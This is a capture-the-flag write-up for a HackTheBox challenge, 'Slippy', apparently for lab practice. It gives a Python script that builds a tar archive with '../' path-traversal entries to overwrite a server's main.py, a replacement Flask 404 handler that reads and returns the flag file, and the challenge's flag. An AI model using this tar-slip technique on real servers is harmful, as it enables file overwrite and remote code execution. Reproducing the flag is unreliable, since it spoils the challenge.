

# SLIPPY

## SOLUTION

You need to create a tar bomb. Replacing one of .py files so it would give you flag. You could create tarbomb tar file with following python script 


```python
# tarbomb.py - script to create exploit tar file
DIR_LEVEL = "../"

def main(argv=sys.argv):
    if len(argv) != 5:
        sys.exit("Incorrect arguments, expected <payload> <output> <depth> <path>")
    payload, output, depth, path = argv[1:5]
        
    if not os.path.exists(payload):
        sys.exit("Invalid payload file")

    if path and path[-1] != '/':
        path += '/'

    print("%s %s %s %s" % (depth, path, payload, output))
    dt_path = "%s%s%s" % ((DIR_LEVEL*int(depth)), path, (os.path.basename(payload)))
    print(dt_path)
    with tarfile.open(output, "w:gz") as t:
        t.add(payload, dt_path)
        t.close()
    print("Created %s containing %s" % (output, dt_path))

if __name__ == '__main__':
     main()

```
Then run it with command  

```bash
python tarbomb.py main.py test3.tar.gz 3 '' 
```

And replace one of main.py endpoint so it would read flag file to you (e.g. 404 route) like this 

```python
# main.py
from flask import Flask, jsonify
from application.blueprints.routes import web, api

app = Flask(__name__)
app.config.from_object('application.config.Config')

app.register_blueprint(web, url_prefix='/')
app.register_blueprint(api, url_prefix='/api')

# Modified endpoing
@app.errorhandler(404)
def not_found(error):
    flag = ''
    with open('/app/flag', 'r') as f:
        flag = f.read()
        
    return jsonify({'flag': flag}), 404

@app.errorhandler(403)
def forbidden(error):
    return jsonify({'error': 'Not Allowed'}), 403

@app.errorhandler(400)
def bad_request(error):
    return jsonify({'error': 'Bad Request'}), 400
```

Then reaching website (e.g. http://64.227.36.32:32660/main.py ) would give you flag 

```
{
  "flag": "HTB{i_slipped_my_way_to_rce}\n"
}
```
